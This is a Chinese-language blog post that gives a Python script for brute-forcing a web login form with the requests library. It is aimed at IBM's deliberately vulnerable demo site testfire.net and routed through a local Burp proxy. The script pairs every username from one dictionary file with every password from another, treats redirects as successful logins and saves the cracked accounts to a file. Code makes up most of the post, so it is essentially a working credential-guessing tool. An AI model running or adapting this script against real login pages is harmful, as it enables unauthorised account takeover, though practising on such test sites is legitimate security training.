{"title": "使用 python 的request模块爆破 form 表单的简易脚本 - 个人文章 ", "index": "安全,request,python", "content": "\npython 的 http 中 request模块在web 表单爆破的使用方法\nrequest模块中代理的使用方式\nrequest 模块是http 中比较全的模块,简单易用,比之前文章中使用的 httplib,urllib,urllib2都要好用.可以替换为request 的 session 方法.\n\n# -*- coding: utf-8 -*-\nimport requests\n\noutFile = open('accounts-cracked.txt', 'w')\ndef brute_force(user, password):\n\n    name = user.strip()#strip() 方法用于移除字符串头尾指定的字符（默认为空格）\n    passwd = password.strip()\n    proxy = {\"http\":\"127.0.0.1:8080\"} \n    #添加代理:本地8080端口的代理是 burp 工具,主要是查看脚本发包回包的情况,好定位问题,如果是 https 网站使用proxy = {\"https\":\"127.0.0.1:8080\"} \n    url = \"http://demo.testfire.net/bank/login.aspx\" #IBM 公司的一个 测试网站\n    user_agent = \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\"\n    header = {\"User-Agent\":user_agent,\"Content-Type\": \"application/x-www-form-urlencoded\", \"Referer\": \"http://demo.testfire.net/bank/login.aspx\"}\n    data = {'uid': name, 'passw': passwd,'btnSubmit':'Login'}\n\n    response = requests.post(url,headers=header,proxies=proxy,data=data,allow_redirects=False)\n    code = response.status_code\n\n    if code == 302 or code==301:\n\n        print '+++++ find user:', name, ' with password:',passwd, '+++++'\n\n        outFile.write(name + ':' + passwd+'\\n' )\n    else:\n        print '----- error user:', name, ' with password:',passwd, '-----'\n    return\n\nif __name__ == '__main__':\n    with open('user.dic', 'r') as userline:\n        y = userline.readlines()\n        with open('pass.dic', 'r') as passline:\n            b= passline.readlines()\n            for u in y:\n                for p in b:\n                    brute_force(user=u,password=p)\noutFile.close()\nwith open('accounts-cracked.txt','r') as text:\n    list = text.readlines()\n    sum=len(list)\n\nif sum>0:\n    print \"找到\",sum,\"个账号密码\"\nelse:\n    print \"All thread OK,maybe not \"\n\n\n                ", "mainLikeNum": ["0 "], "mainBookmarkNum": "2"}